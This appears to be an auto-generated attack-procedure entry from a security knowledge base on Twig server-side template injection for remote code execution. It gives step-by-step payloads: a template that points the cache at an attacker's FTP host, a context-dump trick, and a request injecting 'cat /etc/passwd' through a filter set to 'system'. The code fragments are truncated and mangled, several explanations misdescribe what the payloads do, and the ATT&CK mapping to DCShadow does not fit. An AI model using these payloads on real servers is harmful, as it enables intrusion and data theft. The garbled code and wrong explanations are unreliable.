---
id: d5f6ee00-c013-40da-9230-550442137ad0
name: Twig Template Remote Code Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:40.359138+00:00'
updated_at: '2023-04-10T20:23:34.813735+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
- '[[DCShadow|T1207 - DCShadow]]'
tags:
- '[[Server Side Template Injection]]'
- '[[Twig]]'
- '[[Twig - Code execution]]'
---

# Twig Template Remote Code Execution

## Summary

Twig is a popular templating engine used in many PHP applications. It allows developers to separate the presentation layer from the business logic. However, if Twig templates are not properly sanitized, it can lead to Server-Side Template Injection (SSTI) vulnerabilities. Attackers can exploit thes

## Description

# Description

Twig is a popular templating engine used in many PHP applications. It allows developers to separate the presentation layer from the business logic. However, if Twig templates are not properly sanitized, it can lead to Server-Side Template Injection (SSTI) vulnerabilities. Attackers can exploit these vulnerabilities to execute arbitrary code on the server, leading to full compromise of the application and underlying system. 

In this scenario, the attacker injects malicious code into the Twig template, which when executed, leads to remote code execution. This can be done by injecting a PHP web shell or by injecting code to subscribe with email filter. The business value of this attack is that it allows attackers to gain full control of the application and access sensitive data such as user credentials, payment information, and more.

## Requirements

1. Access to the target application

1. Knowledge of the Twig templating engine

1. Ability to inject malicious code into the template

## Defense

1. Ensure that input validation is performed on all user input

1. Implement a Content Security Policy (CSP) to prevent the execution of untrusted code

1. Regularly update and patch the application and underlying system to prevent known vulnerabilities

## Objectives

1. Execute arbitrary code on the server

1. Gain full control of the application

1. Access sensitive data such as user credentials and payment information

# Instructions

1. This command enables remote code execution in PHP Twig templates. It sets the cache to the attacker's server, loads a backdoor template, registers an undefined filter callback, and uses various filters to execute system commands. 

**Code**: [[{{self}}
{{_self.env.setCache("ftp://attacker.net:]]

> This command can be used to take control of a web application that uses PHP Twig templates. The attacker can provide a malicious template that includes this code, which can then be executed on the server. The code sets up a connection to the attacker's server, loads a backdoor template, and uses various filters to execute system commands. These commands can be used to gather sensitive information, modify files, or even take over the entire server.

2. To use this command, replace the 'FILENAME' with the actual name of the file you want to include. You can also specify the 'OFFSET' and 'LENGTH' arguments to extract a specific part of the context and include it as part of the filename.

**Code**: [[FILENAME{% set var = dump(_context)[OFFSET:LENGTH]]]

> This command allows you to include a file in your code without having to use quotes around the filename. Instead, you can inject the filename as a variable using the 'OFFSET' and 'LENGTH' arguments. This can be useful in situations where you need to dynamically generate the filename or when the filename contains special characters that may cause issues when using quotes.

3. This command is used to subscribe to a service with an email filter. The email address is passed through the FILTER_VALIDATE_EMAIL function in PHP to ensure that it is a valid email address. The command then sends a POST request to the specified URL with the email address included in the request body.

**Code**: [[POST /subscribe?0=cat+/etc/passwd HTTP/1.1
email="]]

> The 'POST' command is used to send data to a server to create or update a resource. In this case, it is used to subscribe to a service. The '/subscribe' endpoint is the specific URL that the data is being sent to. The '0=cat+/etc/passwd' parameter is an example of a command injection attack that could be used to read the contents of the '/etc/passwd' file on the server. The 'email' parameter is the key that the server is expecting to receive the email address under. The '{{app.request.query.filter(0,0,1024,{'options':'system'})}}' syntax is used to pass the email address through the FILTER_VALIDATE_EMAIL function in PHP. The '@attacker.tld' domain is used to indicate that the email address is being sent to the attacker's email server.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]

### Techniques

- [[DCShadow|T1207 - DCShadow]]

## Tags

- [[Server Side Template Injection]]
- [[Twig]]
- [[Twig - Code execution]]
